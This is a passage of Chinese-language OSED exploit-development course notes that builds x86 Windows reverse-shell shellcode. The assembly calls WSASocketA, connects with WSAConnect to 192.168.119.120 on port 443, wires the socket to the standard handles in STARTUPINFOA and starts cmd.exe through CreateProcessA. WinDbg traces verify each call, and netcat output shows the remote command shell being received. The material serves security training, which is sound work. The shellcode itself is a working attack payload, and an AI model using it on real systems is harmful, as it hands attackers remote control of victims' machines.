    "   sub   al, 0x05                  ;"  #   Subtract 0x05 from AL, AL = 0x01
    "   push  eax                       ;"  #   Push type
    "   inc   eax                       ;"  #   Increase EAX, EAX = 0x02
    "   push  eax                       ;"  #   Push af
    "   call dword ptr [ebp+0x20]       ;"  #   Call WSASocketA
```
WinDbg 驗證
```dbg
0:002> bp 02a500f8 

0:002> bl
     0 e Disable Clear  02a500f8     0001 (0001)  0:**** 

0:002> g
Breakpoint 0 hit
eax=00000002 ebx=75070000 ecx=6a720271 edx=00000202 esi=02a50030 edi=01251ca0
eip=02a500f8 esp=02c4f9ec ebp=02c4fe38 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
02a500f8 ff5520          call    dword ptr [ebp+20h]  ss:0023:02c4fe58={WS2_32!WSASocketA (750856d0)}

0:002> dds @esp L6
02c4f9ec  00000002
02c4f9f0  00000001
02c4f9f4  00000006
02c4f9f8  00000000
02c4f9fc  00000000
02c4fa00  00000000

0:002> p
ModLoad: 73af0000 73b40000   C:\Windows\system32\mswsock.dll
eax=00000180 ebx=75070000 ecx=6a720271 edx=012f4204 esi=02a50030 edi=01251ca0
eip=02a500fb esp=02c4fa04 ebp=02c4fe38 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
02a500fb 0000            add     byte ptr [eax],al          ds:0023:00000180=??
```
> - `dds @esp L6`:\
> ![image](https://hackmd.io/_uploads/BJJZUrF0fl.png)
> - `p`: eax=00000180，Socket 建立成功
>> EAX = 0x180 代表取得一個有效的 Socket Descriptor。\
>> 這不是 Socket 的記憶體位址，是 Socket Handle／Descriptor。後續 WSAConnect 需要這個值

### Calling WSAConnect
已經有 Socket 接著利用 [WSAConnect](https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsaconnect) 連接到任何遠端主機
```cpp
int WSAAPI WSAConnect(
  SOCKET         s,
  const sockaddr *name,
  int            namelen,
  LPWSABUF       lpCallerData,
  LPWSABUF       lpCalleeData,
  LPQOS          lpSQOS,
  LPQOS          lpGQOS
);
```
> ![image](https://hackmd.io/_uploads/BydgPHKRfl.png)

自行在 Stack 建立 sockaddr_in 結構，再把它的指標傳給 WSAConnect
- [sockaddr_in](https://docs.microsoft.com/en-us/windows/win32/api/ws2def/ns-ws2def-sockaddr_in) 結構
```cpp
typedef struct sockaddr_in {
#if ...
  short          sin_family;
#else
  ADDRESS_FAMILY sin_family;
#endif
  USHORT         sin_port;
  IN_ADDR        sin_addr;
  CHAR           sin_zero[8];
} SOCKADDR_IN, *PSOCKADDR_IN;
```
> 結構的大小為： 2+2+4+8=16=0x10\
> ![image](https://hackmd.io/_uploads/SyowDHYCfe.png)

>[!important]
>CPU 使用 **Little Endian** 儲存一般整數\
>🥚 Socket 結構中的 Port 使用 Network Byte Order (**Big Endian**)

需要先將 IP 每個數字轉成 Hex，再轉成 Little Endian\
建立 sin_port 和 sin_family、準備 WSAConnect 的七個參數
```python
    " call_wsaconnect:                   "  #
    "   mov   esi, eax                  ;"  #   Move the SOCKET descriptor to ESI
    "   xor   eax, eax                  ;"  #   Null EAX
    "   push  eax                       ;"  #   Push sin_zero[]
    "   push  eax                       ;"  #   Push sin_zero[]
    "   push  0x7877a8c0                ;"  #   Push sin_addr (192.168.119.120)
    "   mov   ax, 0xbb01                ;"  #   Move the sin_port (443) to AX
    "   shl   eax, 0x10                 ;"  #   Left shift EAX by 0x10 bits
    "   add   ax, 0x02                  ;"  #   Add 0x02 (AF_INET) to AX
    "   push  eax                       ;"  #   Push sin_port & sin_family
    "   push  esp                       ;"  #   Push pointer to the sockaddr_in structure
    "   pop   edi                       ;"  #   Store pointer to sockaddr_in in EDI
    "   xor   eax, eax                  ;"  #   Null EAX
    "   push  eax                       ;"  #   Push lpGQOS
    "   push  eax                       ;"  #   Push lpSQOS
    "   push  eax                       ;"  #   Push lpCalleeData
    "   push  eax                       ;"  #   Push lpCallerData
    "   add   al, 0x10                  ;"  #   Set AL to 0x10
    "   push  eax                       ;"  #   Push namelen
    "   push  edi                       ;"  #   Push *name
    "   push  esi                       ;"  #   Push s
    "   call dword ptr [ebp+0x24]       ;"  #   Call WSAConnect
```
WinDbg 驗證 WSAConnect:
```dbg
0:002> bp 0235011f 

0:002> g
ModLoad: 73af0000 73b40000   C:\Windows\system32\mswsock.dll
Breakpoint 0 hit
eax=00000010 ebx=75070000 ecx=adbfb388 edx=00aed3fc esi=00000180 edi=0254f8d0
eip=0235011f esp=0254f8b4 ebp=0254fd14 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
0235011f ff5524          call    dword ptr [ebp+24h]  ss:0023:0254fd38={WS2_32!WSAConnect (75084d90)}

0:002> dds @esp L7
0254f8b4  00000180
0254f8b8  0254f8d0
0254f8bc  00000010
0254f8c0  00000000
0254f8c4  00000000
0254f8c8  00000000
0254f8cc  00000000

0:002> dds 0254f8d0 L4
0254f8d0  bb010002
0254f8d4  7877a8c0
0254f8d8  00000000
0254f8dc  00000000
```
> ```asm
> Address       Bytes
>0254f8d0      02 00 01 BB
>0254f8d4      C0 A8 77 78
>0254f8d8      00 00 00 00
>0254f8dc      00 00 00 00
> ```
> 對應：
> ```
> sin_family = 2
> sin_port   = 443
> sin_addr   = 192.168.119.120
> sin_zero   = 0
> ```

驗證 TCP 連線
```
┌──(chw💲CHW)-[~]
└─$  sudo nc -lvp 443
[sudo] password for chw: 
listening on [any] 443 ...
192.168.119.10: inverse host lookup failed: Unknown host
connect to [192.168.119.120] from (UNKNOWN) [192.168.120.10] 51336
```
再回到 WinDbg：
```dbg
0:002> p
eax=00000000 ebx=75070000 ecx=adbfb388 edx=770a4550 esi=00000180 edi=0254f8d0
eip=02350122 esp=0254f8d0 ebp=0254fd14 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
02350122 0000            add     byte ptr [eax],al          ds:0023:00000000=??
```
> WSAConnect 回傳 0，表示連線成功

### Calling CreateProcessA
到目前已完成：
1. 載入 ws2_32.dll
2. 呼叫 WSAStartup 初始化 Winsock
3. 呼叫 WSASocketA 建立 Socket
4. 呼叫 WSAConnect 連接 Kali

現在 Kali 端只收到一條 TCP 連線，還不能透過它操作 Windows\
👉🏻 利用 [CreateProcessA](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa) 啟動 cmd.exe

CreateProcessA Function Prototype:
```cpp
BOOL CreateProcessA(
  LPCSTR                lpApplicationName,
  LPSTR                 lpCommandLine,
  LPSECURITY_ATTRIBUTES lpProcessAttributes,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  BOOL                  bInheritHandles,
  DWORD                 dwCreationFlags,
  LPVOID                lpEnvironment,
  LPCSTR                lpCurrentDirectory,
  LPSTARTUPINFOA        lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
);
```
>![image](https://hackmd.io/_uploads/By6njrKRMe.png)
> - `bInheritHandles = TRUE;` 允許子程序繼承可繼承的 Handle
> - `lpStartupInfo` 負責告訴 Windows 新程序的標準輸入、輸出及錯誤輸出應該使用哪個 Handle

STARTUPINFOA 結構
```cpp
typedef struct _STARTUPINFOA {
    DWORD  cb;
    LPSTR  lpReserved;
    LPSTR  lpDesktop;
    LPSTR  lpTitle;
    DWORD  dwX;
    DWORD  dwY;
    DWORD  dwXSize;
    DWORD  dwYSize;
    DWORD  dwXCountChars;
    DWORD  dwYCountChars;
    DWORD  dwFillAttribute;
    DWORD  dwFlags;
    WORD   wShowWindow;
    WORD   cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
} STARTUPINFOA;
```
這個結構在 x86 環境下的大小為 0x44 = 68 bytes\
使用 WinDbg 查詢 dt STARTUPINFOA
```dbg
0:002> dt STARTUPINFOA
MSVCR120!STARTUPINFOA
   +0x000 cb               : Uint4B
   +0x004 lpReserved       : Ptr32 Char
   +0x008 lpDesktop        : Ptr32 Char
   +0x00c lpTitle          : Ptr32 Char
   +0x010 dwX              : Uint4B
   +0x014 dwY              : Uint4B
   +0x018 dwXSize          : Uint4B
   +0x01c dwYSize          : Uint4B
   +0x020 dwXCountChars    : Uint4B
   +0x024 dwYCountChars    : Uint4B
   +0x028 dwFillAttribute  : Uint4B
   +0x02c dwFlags          : Uint4B
   +0x030 wShowWindow      : Uint2B
   +0x032 cbReserved2      : Uint2B
   +0x034 lpReserved2      : Ptr32 UChar
   +0x038 hStdInput        : Ptr32 Void
   +0x03c hStdOutput       : Ptr32 Void
   +0x040 hStdError        : Ptr32 Void
   
0:002> ?? sizeof(STARTUPINFOA)
unsigned int 0x44
```
Shellcode 除了需要知道 API 的參數，還必須知道參數所指向的結構長什麼樣、結構需要多少記憶體空間

建立 STARTUPINFOA 結構
```python
    " create_startupinfoa:               "  #
    "   push  esi                       ;"  #   Push hStdError
    "   push  esi                       ;"  #   Push hStdOutput
    "   push  esi                       ;"  #   Push hStdInput
    "   xor   eax, eax                  ;"  #   Null EAX   
    "   push  eax                       ;"  #   Push lpReserved2
    "   push  eax                       ;"  #   Push cbReserved2 & wShowWindow
    "   mov   al, 0x80                  ;"  #   Move 0x80 to AL
    "   xor   ecx, ecx                  ;"  #   Null ECX
    "   mov   cx, 0x80                  ;"  #   Move 0x80 to CX
    "   add   eax, ecx                  ;"  #   Set EAX to 0x100
    "   push  eax                       ;"  #   Push dwFlags
    "   xor   eax, eax                  ;"  #   Null EAX   
    "   push  eax                       ;"  #   Push dwFillAttribute
    "   push  eax                       ;"  #   Push dwYCountChars
    "   push  eax                       ;"  #   Push dwXCountChars
    "   push  eax                       ;"  #   Push dwYSize
    "   push  eax                       ;"  #   Push dwXSize
    "   push  eax                       ;"  #   Push dwY
    "   push  eax                       ;"  #   Push dwX
    "   push  eax                       ;"  #   Push lpTitle
    "   push  eax                       ;"  #   Push lpDesktop
    "   push  eax                       ;"  #   Push lpReserved
    "   mov   al, 0x44                  ;"  #   Move 0x44 to AL
    "   push  eax                       ;"  #   Push cb
    "   push  esp                       ;"  #   Push pointer to the STARTUPINFOA structure
    "   pop   edi                       ;"  #   Store pointer to STARTUP
```
建立 cmd.exe 字串，使用 NEG 避免產生 NULL Byte
```python
    " create_cmd_string:                 "  #
    "   mov   eax, 0xff9a879b           ;"  #   Move 0xff9a879b into EAX
    "   neg   eax                       ;"  #   Negate EAX, EAX = 00657865
    "   push  eax                       ;"  #   Push part of the "cmd.exe" string
    "   push  0x2e646d63                ;"  #   Push the remainder of the "cmd.exe" string
    "   push  esp                       ;"  #   Push pointer to the "cmd.exe" string
    "   pop   ebx                       ;"  #   Store pointer to the "cmd.exe" string in EBX
```
目前已經有：
- ESI = Socket Descriptor
- EDI = STARTUPINFOA 結構指標
- EBX = cmd.exe 字串指標

接著呼叫 CreateProcessA:
```python
    " call_createprocessa:               "  #
    "   mov   eax, esp                  ;"  #   Move ESP to EAX
    "   xor   ecx, ecx                  ;"  #   Null ECX
    "   mov   cx, 0x390                 ;"  #   Move 0x390 to CX
    "   sub   eax, ecx                  ;"  #   Subtract CX from EAX to avoid overwriting the structure later
    "   push  eax                       ;"  #   Push lpProcessInformation
    "   push  edi                       ;"  #   Push lpStartupInfo
    "   xor   eax, eax                  ;"  #   Null EAX   
    "   push  eax                       ;"  #   Push lpCurrentDirectory
    "   push  eax                       ;"  #   Push lpEnvironment
    "   push  eax                       ;"  #   Push dwCreationFlags
    "   inc   eax                       ;"  #   Increase EAX, EAX = 0x01 (TRUE)
    "   push  eax                       ;"  #   Push bInheritHandles
    "   dec   eax                       ;"  #   Null EAX
    "   push  eax                       ;"  #   Push lpThreadAttributes
    "   push  eax                       ;"  #   Push lpProcessAttributes
    "   push  ebx                       ;"  #   Push lpCommandLine
    "   push  eax                       ;"  #   Push lpApplicationName
    "   call dword ptr [ebp+0x18]       ;"  #   Call
```
在 Stack 另外保留空間，供 PROCESS_INFORMATION 結構使用\
![image](https://hackmd.io/_uploads/BJDfAHKRMe.png)

WinDbg 驗證 CreateProcessA
```dbg
0:002> bp 0294016c 

0:002> g
ModLoad: 73af0000 73b40000   C:\Windows\system32\mswsock.dll
Breakpoint 0 hit
eax=00000000 ebx=02b3f304 ecx=00000390 edx=770a4550 esi=00000180 edi=02b3f30c
eip=0294016c esp=02b3f2dc ebp=02b3f794 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0294016c ff5518          call    dword ptr [ebp+18h]  ss:0023:02b3f7ac={KERNEL32!CreateProcessAStub (76e68d80)}

0:002> p
eax=00000001 ebx=02b3f304 ecx=74517fd6 edx=00000000 esi=00000180 edi=02b3f30c
eip=0294016f esp=02b3f304 ebp=02b3f794 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0294016f 0000            add     byte ptr [eax],al          ds:0023:00000001=??
```
> - `eip=0294016c`, `ff5518  call dword ptr [ebp+18h]` 代表即將呼叫 KERNEL32!CreateProcessAStub
> - CreateProcessA 回傳非零值代表成功，0 代表失敗\
> EAX = 1 表示 Windows 成功建立了新程序

(Kali)
```
┌──(chw💲CHW)-[~]
└─$  sudo nc -lvp 443
[sudo] password for chw: 
listening on [any] 443 ...
192.168.119.10: inverse host lookup failed: Unknown host
connect to [192.168.119.120] from (UNKNOWN) [192.168.120.10] 51438
Microsoft Windows [Version 10.0.16299.15]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Users\offsec\Desktop>
```
取得 Windows Command Shell

Windows 流程：
```
LoadLibraryA
    ↓
WSAStartup
    ↓
WSASocketA
    ↓
WSAConnect
    ↓
CreateProcessA
    ↓
cmd.exe
```

# x64 Custom Shellcode Creation
>[!Caution]
> HackMD 筆記長度限制，接續 [[OSED, EXP-301] Instructional notes - Part 5](https://chw41.github.io/b1og/osed-exp-301-instructional-notes---part-5/)
 

# [Link to: "[OSED, EXP-301] Instructional notes - Part 5"](https://chw41.github.io/b1og/osed-exp-301-instructional-notes---part-5/)

# [Link to: "[OSED, EXP-301] Instructional notes - Part 6"](https://chw41.github.io/b1og/osed-exp-301-instructional-notes---part-6/)

